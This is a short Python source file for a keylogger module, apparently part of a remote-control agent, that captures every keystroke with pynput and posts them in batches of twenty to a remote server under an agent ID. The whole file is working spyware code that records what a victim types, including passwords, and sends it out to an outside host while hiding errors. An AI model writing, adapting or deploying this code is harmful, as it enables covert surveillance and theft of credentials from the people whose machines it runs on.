import threading
import requests
from pynput import keyboard
from shared.config import SERVER_URL, AGENT_ID

log_buffer = ""
lock = threading.Lock()

def send_keystrokes(data):
    try:
        payload = {"result": f"[KEYLOG] {data}"}
        requests.post(f"{SERVER_URL}/send-result/{AGENT_ID}", json=payload)
    except Exception:
        pass

def on_press(key):
    global log_buffer
    try:
        k = key.char
    except AttributeError:
        k = f"[{key.name}]"

    with lock:
        log_buffer += k
        if len(log_buffer) >= 20:
            send_keystrokes(log_buffer)
            log_buffer = ""

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
